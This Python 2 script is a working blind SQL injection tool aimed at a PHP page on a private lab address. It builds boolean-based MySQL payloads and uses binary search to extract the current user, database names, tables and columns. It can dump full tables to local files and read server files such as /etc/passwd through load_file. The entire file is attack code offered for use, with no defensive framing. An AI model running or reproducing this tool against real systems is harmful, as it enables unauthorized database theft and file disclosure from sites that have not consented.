#! /usr/bin/env python
# -*- coding:utf-8 -*-
# author:flystart
# home:www.flystart.org


import requests
import sys
import binascii
from requests.adapters import HTTPAdapter
from time import time


url = "http://192.168.181.150/sqlinject.php"
success_flag = "liusai"
keys=list(r''' @ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz{|}~!"#$%&'()*+,-./0123456789:;<=>?[\]^_`''')

bo = " and ord(substr((%query) from %index for 1))=%value"
b01 = " and 1=(if((ord(substr((%query) from %index for 1))>%value),1,0))"
blind_count = " and 1=(if(((%query)>%value),1,0))"
query = "(select %s from t_n limit %d,1)"
len_bounday = " and length(%query)=%value"
len_bounday2 = " and 1=(if((length(%query)>%value),1,0))"
boundary = b01

query_tab="(select %s from t_n where table_schema={db} limit %d,1)"
query_col="(select %s from t_n where table_schema={db} and table_name={table} limit %d,1)"

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
}
proxies = {'http':'127.0.0.1:8080'}
inject_point = {'id':'2'}

conf ={'url':url,'method':'post','proxies':{},'inject':inject_point,'debug':False}
conf['proxies'] = proxies
req = requests.session()
req.headers = headers
req.mount('http://', HTTPAdapter(max_retries=3))
req.mount('https://', HTTPAdapter(max_retries=3))
req.proxies = conf['proxies']


def main():
    print('Help info\nPlease provide your action:[get_current_user|get_current_db|get_dbs|get_tables|get_columns|read_file|dump|dump_all]')
    print('main')
    act = raw_input("Please raw_input your action:")
    action(act)


def put_file_contents(filename,contents):
    with open(filename,"a+") as fin:
        fin.write(contents+"\n")


def action(act):
    if act == 'get_current_user':
        user = get_current_user()
        print("current_user:"+user)
    if act == 'get_current_db':
        db = get_current_database()
        print("current_db:" + db)
    if act == 'get_dbs':
        dbs = get_dbs()
        print("all dbs is:",dbs)
    if act == 'get_tables':
        db = raw_input('please_db_name:')
        tables = get_tables(db)
        print("{0} tables".format(db),tables)
    if act == 'get_columns':
        db = raw_input('please_db_name:')
        table = raw_input('please_table_name:')
        cols = get_columns(db,table)
        print(cols)
    if act == 'dump':
        db = raw_input('please_db_name:')
        table = raw_input('please_table_name:')
        col = raw_input('please_column_name:')
        text = dump(db,table,col)
        print(text)
    if act == 'dump_all':
        db = raw_input('please_db_name:')
        dump_all(db)
    if act == 'read_file':
        filename = raw_input('please input filename:/etc/passwd:')
        text = read_file(filename)
        if text:
            put_file_contents('down_file_con.txt',text +"{0}\n".format('*'*10))
            print(text)
    return

def find_success(flag,text):
    text =str(text)
    ret = False
    if flag in text:
        ret = True
    return ret


def format_hex(str):
    return "0x"+binascii.b2a_hex(str)


def get_current_database():
    table_name = 'information_schema.schemata'
    col_name = ["database()"]
    database = get_values_by_double_blind(table_name,col_name,'0',query=query)
    return database


def get_current_user():
    table_name = 'information_schema.schemata'
    col_name = ["user()"]
    user= get_values_by_double_blind(table_name, col_name, '0', query=query)
    return user


def read_file(filename):
    file = 'load_file({0})'.format(format_hex(filename))
    table_name = 'information_schema.schemata'
    col_name = [file]
    text = get_values_by_double_blind(table_name,col_name,'0',query=query)
    return text


def get_dbs():
    dbs = []
    table_name = 'information_schema.schemata'
    col_name = ["schema_name"]
    cur_query = query
    counts = get_counts(table_name, col_name,query=cur_query)
    print("all tables counts is :%s" % counts)
    for i in range(int(counts)):
        db= get_values_by_double_blind(table_name, col_name, str(i),query=cur_query)
        dbs.append(db)
        print("Ent:" + db)
    return dbs


def get_tables(db):
    table_name = 'information_schema.tables'
    col_name = ["table_name"]
    cur_query = query_tab.replace("{db}", format_hex(db))
    counts = get_counts(table_name, col_name,query=cur_query)
    print("all tables counts is :%s" % counts)
    tables = []
    for i in range(int(counts)):
        table = get_values_by_double_blind(table_name, col_name, str(i),query=cur_query)
        tables.append(table)
        print("Ent:" + table)
    return tables


def get_columns(db,table):
    table_name = 'information_schema.columns'
    col_name = ["column_name"]
    cur_query= query_col.replace("{db}", format_hex(db)).replace("{table}", format_hex(table))
    counts = get_counts(table_name, col_name,query=cur_query)
    print("all tables counts is :%s" % counts)
    columns = []
    for i in range(int(counts)):
        col = get_values_by_double_blind(table_name, col_name, str(i),query =cur_query)
        columns.append(col)
        print("Ent:" + col)
    return columns


def dump(db, table, col):
    table_name = '{0}.{1}'.format(db, table)
    col_name = ["{0}".format(col)]
    cur_query = query
    counts = get_counts(table_name, col_name,query = cur_query)
    data = []
    for i in range(int(counts)):
        value = get_values_by_double_blind(table_name, col_name, str(i),query =cur_query)
        info = ("Ent:{0}.{1}:{2}".format(table_name, col_name, value))
        print(info)
        put_file_contents('dump_data.txt',info)
        data.append(value)
    return data


def dump_all(db):
    dbs = [db]
    tables = []
    cols = []
    for db in dbs:
        if not tables:
            tables = get_tables(db)
        print(tables)
        for table in tables:
                cols = get_columns(db,table)
                print(cols)
                for col in cols:
                    data = dump(db, table, col)
                    print(data)
                    data = '|'.join(data)
                    put_file_contents('dump_data.txt', data)
    return


def get_counts(table_name,cols,i="0",query=query):
    global boundary
    cols= ["count(*)"]
    counts = ''
    orgin_boundary = boundary
    boundary = blind_count
    counts =  double_search(table_name, cols, i, "", left_number=0, right_number=10,query =query)
    boundary = orgin_boundary
    print("CountsEnties:" + str(counts))
    return counts


def get_length(table_name,cols,i=0,query =query): # limit i
    global  boundary
    # boundary = len_query
    boundary = len_bounday2
    len_index = double_search(table_name, cols,i,"",left_number=0,right_number=10,query=query)
    boundary = b01 # double_query get value
    print('value len is:',len_index)
    return len_index


def get_values_by_blind(table_name, col_name, in_limit='0', query =query):
    len = get_length(table_name, col_name, in_limit)
    cu_query = query
    temp = ""
    for i in range(1, len + 1):
        for key in keys:
            payload = get_payload(table_name, col_name, in_limit, str(i), str(ord(key)),query=cu_query)
            global url
            con_url = url + ' ' + payload
            res = req.get(con_url)
            if find_success(success_flag, res.text):
                temp = temp + key
                print(temp)
    return temp


def send_data(payload):
    ret = ''
    param = {}
    post_data = {}
    inject_key = list(conf['inject'].keys())[0]
    value = conf['inject'][inject_key]+payload
    #param.update({inject_key:value})
    post_data.update({inject_key:value})
    method = conf['method']
    url = conf['url']
    if 'get' == method:
        response = req.get(url,params=param)
        if response.status_code == 200:
            ret = response.content
    if 'post' == method:
        response = req.post(url,params =param,data = post_data)
        if response.status_code == 200:
            ret = response.content
    if not ret:
        print("send data not success!")
        sys.exit(0)
    return ret


def tamper(payload):
    return payload


def get_payload(table_name,col_name,i="0",index="",value="",query =query): # (index,vaule) is used blind
    cols = []
    for col in col_name:
        cols.append(col)
    cat_str = cols[0]
    payload = query.replace('t_n',table_name)
    payload = payload.replace('%s', cat_str)
    payload = payload.replace('%d', i)
    payload = boundary.replace('%query', payload)
    payload = payload.replace('%index', index)
    payload = payload.replace('%value', value)
    payload = ' '+ payload
    if conf['debug']:
        print(payload)
    payload = tamper(payload)
    return payload


def get_values_by_double_blind(table_name, col_name, in_limit='0', query =query):
    cu_query = query
    len = int(get_length(table_name, col_name, in_limit,cu_query))
    text = ""
    for i in range(1, len + 1):
        value = double_search(table_name, col_name, in_limit, str(i),query=cu_query,left_number=0,right_number=96)
        text = text + chr(value)
        print("In program: " + text)
    return text


def double_search(table_name, col_name, in_limit='0', index="", query =query,left_number=0, right_number=0):
    while True:
        payload = get_payload(table_name, col_name, in_limit, index, value=str(right_number), query=query)
        text = send_data(payload)
        if find_success(success_flag, text):
            left_number = right_number
            right_number = 2*right_number
        else:
            break

    while left_number < right_number:
        mid = int((left_number + right_number) / 2)
        payload = get_payload(table_name,col_name,in_limit,index,value=str(mid),query =query)
        text =send_data(payload)
        if find_success(success_flag, text):
            left_number = mid
        else:
            right_number = mid
        if left_number == right_number - 1:
            payload = get_payload(table_name, col_name, in_limit, index, value=str(mid), query=query)
            text = send_data(payload)
            if find_success(success_flag, text):
                mid += 1
                print('found')
                break
            else:
                break
    return mid


if __name__ == '__main__':
    start_time = time()
    main()
    print('cost time:{0}'.format(time()-start_time))